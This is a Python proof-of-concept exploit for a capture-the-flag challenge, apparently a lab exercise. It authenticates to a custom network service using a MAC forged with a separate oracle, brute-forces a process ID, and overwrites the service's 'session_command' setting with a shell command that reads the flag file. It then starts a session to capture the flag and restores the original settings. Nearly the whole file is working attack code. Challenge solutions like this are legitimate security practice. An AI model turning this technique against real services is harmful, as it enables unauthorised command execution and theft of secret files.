#!/usr/bin/env python3
"""Single-target Reverse PoC for the IBOH reverse-my-connection challenge.

Run in an authorized challenge shell with a route to the target. The supplied
sphostd MAC is calculated locally and pasted at each prompt. The script writes
the captured flag to a mode-600 output file and restores/verifies settings.
"""
import argparse
import os
import re
import socket
import struct
import sys
import time

FLAG_RE = re.compile(rb"flag\{[^}\r\n]{1,200}\}")
TEMP_COMMAND = b'cat "$RSCTF_FLAG_FILE" 1>&3'

def frame(op, payload=b""):
    return bytes((op,)) + struct.pack("<H", len(payload)) + payload

def read_exact(sock, count):
    data = bytearray()
    while len(data) < count:
        part = sock.recv(count - len(data))
        if not part:
            raise EOFError("connection closed")
        data.extend(part)
    return bytes(data)

def read_frame(sock):
    head = read_exact(sock, 3)
    op, length = head[0], struct.unpack("<H", head[1:])[0]
    return op, read_exact(sock, length)

def read_line(sock):
    data = bytearray()
    while not data.endswith(b"\n"):
        part = sock.recv(1)
        if not part:
            raise EOFError("connection closed while reading line")
        data.extend(part)
    return data.decode("utf-8", "replace").strip()

def authenticate(host, port, timeout):
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    sock.sendall(frame(1, os.urandom(16)))
    op, nonce = read_frame(sock)
    if op != 2 or len(nonce) != 16:
        sock.close()
        raise RuntimeError("unexpected challenge frame")
    print("MAC_FOR=" + nonce.hex(), flush=True)
    mac_text = input("Paste 32 hex chars from reverse_mac_oracle.py: ").strip()
    try:
        mac = bytes.fromhex(mac_text)
    except ValueError:
        sock.close()
        raise RuntimeError("MAC is not valid hex")
    if len(mac) != 16:
        sock.close()
        raise RuntimeError("MAC must be 16 bytes")
    sock.sendall(frame(3, mac))
    if read_line(sock) != "OK authenticated":
        sock.close()
        raise RuntimeError("authentication failed")
    return sock

def identify(sock, preferred=None):
    pids = []
    if preferred is not None:
        pids.append(preferred)
    pids.extend(pid for pid in range(1, 31) if pid not in pids)
    for pid in pids:
        sock.sendall(frame(4, struct.pack("<I", pid) + bytes(12)))
        response = read_line(sock)
        if response == "OK identified":
            return pid
        if response not in ("ERR not identified", "ERR bad identify"):
            raise RuntimeError("unexpected identify response: " + response)
    raise RuntimeError("no service PID identified in 1..30")

def read_settings(sock):
    values = {}
    for index in range(9):
        op, payload = read_frame(sock)
        if op != 7 or len(payload) < 3:
            raise RuntimeError("invalid setting frame " + str(index))
        name_len = payload[0]
        if len(payload) < 3 + name_len:
            raise RuntimeError("short setting header")
        name = payload[1:1 + name_len].decode("utf-8", "strict")
        value_len = struct.unpack("<H", payload[1 + name_len:3 + name_len])[0]
        value = payload[3 + name_len:]
        if len(value) != value_len or name in values:
            raise RuntimeError("invalid or duplicate setting " + name)
        values[name] = value
    op, payload = read_frame(sock)
    if op != 8 or payload:
        raise RuntimeError("settings terminator missing")
    if len(values) != 9 or "session_command" not in values:
        raise RuntimeError("expected nine settings including session_command")
    return values

def set_session_command(sock, value):
    name = b"session_command"
    payload = bytes((len(name),)) + name + struct.pack("<H", len(value)) + value
    sock.sendall(frame(5, payload))
    response = read_line(sock)
    if response != "OK session_command set":
        raise RuntimeError("setting acknowledgement failed")

def read_started_session(sock, timeout):
    sock.settimeout(timeout)
    output = bytearray()
    deadline = time.monotonic() + timeout
    started = b"OK session started\n"
    while time.monotonic() < deadline:
        try:
            part = sock.recv(4096)
        except socket.timeout:
            break
        if not part:
            break
        output.extend(part)
        match = FLAG_RE.search(output)
        if started in output and match:
            return match.group(0)
    raise RuntimeError("session output lacked a flag before timeout")

def fetch_settings(host, port, pid, timeout):
    sock = authenticate(host, port, timeout)
    try:
        identify(sock, pid)
        return read_settings(sock)
    finally:
        sock.close()

def restore_fresh(host, port, pid, original, timeout):
    sock = authenticate(host, port, timeout)
    try:
        identify(sock, pid)
        current = read_settings(sock)
        if current.get("session_command") != original:
            set_session_command(sock, original)
    finally:
        sock.close()

def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=7777)
    ap.add_argument("--pid", type=int)
    ap.add_argument("--out", default="/tmp/captured_flag")
    ap.add_argument("--timeout", type=float, default=12.0)
    ap.add_argument("--execute", action="store_true", help="temporarily run the read-only flag command")
    args = ap.parse_args()
    if not args.execute:
        ap.error("add --execute to perform the temporary session_command change")

    sock = authenticate(args.host, args.port, args.timeout)
    changed = False
    action_error = None
    try:
        pid = identify(sock, args.pid)
        before = read_settings(sock)
        original = before["session_command"]
        try:
            changed = True
            set_session_command(sock, TEMP_COMMAND)
            sock.sendall(frame(6))
            captured = read_started_session(sock, args.timeout)
        except Exception as exc:
            action_error = exc
        finally:
            if changed:
                try:
                    set_session_command(sock, original)
                except Exception:
                    pass
            sock.close()

        after = fetch_settings(args.host, args.port, pid, args.timeout)
        if after.get("session_command") != original:
            restore_fresh(args.host, args.port, pid, original, args.timeout)
            after = fetch_settings(args.host, args.port, pid, args.timeout)
        if after != before:
            raise RuntimeError("full settings readback differs; stop and inspect target")
        if action_error is not None:
            raise RuntimeError("capture failed after settings restoration: " + type(action_error).__name__)
        fd = os.open(args.out, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "wb") as output:
            output.write(captured + b"\n")
        os.chmod(args.out, 0o600)
        print("RESTORATION_VERIFIED=True")
        print("FLAG_SAVED=" + args.out)
        return 0
    except Exception as exc:
        try:
            sock.close()
        except Exception:
            pass
        print("PoC stopped: " + type(exc).__name__ + ": " + str(exc), file=sys.stderr)
        return 2

if __name__ == "__main__":
    raise SystemExit(main())
